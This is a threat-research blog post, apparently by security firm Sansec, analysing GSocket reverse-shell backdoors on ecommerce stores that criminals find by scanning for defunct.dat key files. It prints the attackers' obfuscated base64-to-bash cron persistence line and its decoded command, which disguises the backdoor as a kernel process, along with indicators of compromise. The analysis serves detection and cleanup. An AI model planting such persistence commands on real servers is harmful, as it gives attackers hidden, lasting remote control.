---
title: Found defunct.dat on your site? You've got a problem.
author: Sansec Forensics Team
url: https://sansec.io/research/gsocket
hostname: sansec.io
description: Sansec found criminals mass-scanning for defunct.dat files which contain GSocket backdoor keys. A quick scan reveals dozens of infected stores.
sitename: Sansec
date: "2025-04-03"
categories: ['Threat Research']
tags: ['backdoor, malware, adobe-commerce, ecommerce-security', 'backdoor', 'malware', 'adobe-commerce', 'ecommerce-security']
fingerprint: "75b90920b4f304c3"
---
# Found defunct.dat on your site? You've got a problem.

by Sansec Forensics Team

Published in [Threat Research](https://sansec.io/research) − April 03, 2025

Sansec found criminals mass-scanning for defunct.dat files which contain GSocket backdoor keys. A quick scan reveals dozens of infected stores.

The Sansec Shield WAF detected mass scans for "defunct.dat" and "qfile" files this week. As it turns out, these files contain connection keys that can be used to launch a GSocket reverse shell, effectively handing over the server to anyone with the key.

To figure out what is going on, we scanned 80,000 stores for these files and found 45 that had running GSocket backdoors. We contacted one of the stores and confirmed that their server had been compromised.

## What is GSocket?

GSocket is a popular tool among cybercriminals, as it enables anonymous logins on servers, even if they are behind a firewall or on a private network. It uses a disguised background process that persists via an obfuscated cronjob.

## Whac-a-mole with other malware

We correlated the GSocket presence with our daily crawler data. This showed that most of the stores had been infected with other malware as well. Merchants attempted to clean up the infection, but (given that GSocket is cleverly hidden) failed to fix the root problem. In some cases, the attacker managed to reinfect the store 7 times. Sysadmins must have been pulling their hair out.

Noteworthy: this attack is particularly effective on Adobe Commerce Cloud. This platform uses read-only storage for code files, however GSocket can be run from a memory file descriptor and is not affected by this.

## Technical analysis

A typical GSocket backdoor uses cron as a method of persistence. It looks like this:

```
$ crontab -l
# DO NOT REMOVE THIS LINE. SEED PRNG. #defunct-kernel
0 * * * * { echo L3Vzci9iaW4vcGtpbGwgLTAgLVUzMyBkZWZ1bmN0IDI+L2Rldi9udWxsIHx8IFNIRUxMPSBURVJNPXh0ZXJtLTI1NmNvbG9yIEdTX0FSR1M9Ii1rIC92YXIvd3d3L3B1Yi9kZWZ1bmN0LmRhdCAtbGlxRCIgL3Vzci9iaW4vYmFzaCAtYyAiZXhlYyAtYSAnW21tX3BlcmNwdV93cV0nICcvdmFyL3d3dy9wdWIvZGVmdW5jdCciIDI+L2Rldi9udWxsCg==|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng defunct-kernel
```
Which decodes to the launch of gsocket (stored as `defunct`) and hides as `[nm_percpu_wq]` (an internal Linux kernel process).

```
/usr/bin/pkill -0 -U33 defunct 2>/dev/null || SHELL= TERM=xterm-256color GS_ARGS="-k /var/www/pub/defunct.dat -liqD" /usr/bin/bash -c "exec -a '[mm_percpu_wq]' '/var/www/pub/defunct'" 2>/dev/null
```
In the process list, this shows up as:

```
www-data 12393  0.0  0.0   3160     4 ?        Ss   Feb02   0:00 [mm_percpu_wq]
```
We reported about the use of [GSocket in eCommerce attacks](https://sansec.io/research/cosmicsting-cnext-persistent-backdoor) previously but this time it shows two things:

1. Competing criminals are searching for each other's connection keys.
2. Merchants struggle to clean up hidden backdoors

## How to detect & prevent GSocket?

Because GSocket hides itself as various legitimate processes, it can be hard to find. We recommend to run [eComscan](https://sansec.io/guides/usage) which will find all instances of GSocket, plus any persistence mechanisms.

A GSocoket backdoor is a symptom of an earlier breach. While this can be anything, the cases we analyzed all show a previous infection using the ICONV bug and/or a TrojanOrder attack. We recommend to run a specialized eCommerce WAF such as [Sansec Shield](https://sansec.io/guides/sansec-shield), which would have prevented all of these cases.

## IOCs

```
45.77.95.4
/pub/defunct.dat
/errors/defunct.dat
/pub/qfile
/defunct.dat
```
## Read more

##### In this article

##### Protect your store now!

Block all known Magento attacks, while you schedule the latest critical patch until a convenient moment. No more downtime and instability from rushed patching.

[Get Sansec Shield](https://sansec.io/shield)

## Scan your store now

for malware & vulnerabilities

[eComscan](https://sansec.io/#ecomscan) is the most thorough security scanner for Magento, Adobe Commerce, Shopware, WooCommerce, Sylius and many more.

[Learn more](https://sansec.io/#ecomscan)
